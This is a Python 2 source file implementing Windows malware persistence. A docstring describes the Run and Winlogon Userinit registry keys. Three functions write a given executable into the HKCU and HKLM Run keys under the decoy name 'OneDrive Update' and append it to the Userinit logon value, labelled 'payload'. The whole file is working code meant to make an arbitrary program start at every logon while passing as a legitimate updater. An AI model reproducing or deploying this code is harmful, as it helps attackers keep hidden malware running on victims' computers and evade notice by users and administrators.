"""
"Software\Microsoft\Windows\CurrentVersion\Run"
	
These are the most common startup locations for programs
to install auto start from. By default these keys are not executed
in Safe mode.

"Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit"

This key specifies what program should be launched right after a user
logs into Windows. The default program for this key is
C:\windows\system32\userinit.exe. Userinit.exe is a program that
restores your profile, fonts, colors, etc for your user name. It is
possible to add further programs that will launch from this key by
separating the programs with a comma.
"""
import os
import _winreg

def hkcu_auto_run_persistence(executable):
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run")
		_winreg.SetValueEx(key,"OneDrive Update",0,_winreg.REG_SZ,executable)
	except Exception as error:
		return False

def hklm_auto_run_persistence(executable):
	try:
		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,"Software\Microsoft\Windows\CurrentVersion\Run")
		_winreg.SetValueEx(key,"OneDrive Update",0,_winreg.REG_SZ,executable)
	except Exception as error:
		return False

def hklm_userinit_auto_run_persistence(executable):
	payload = "c:\windows\system32\userinit.exe,{}".format(executable)
	
	try:
		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
		_winreg.SetValueEx(key,"Userinit",0,_winreg.REG_SZ,payload)
	except Exception as error:
		return False
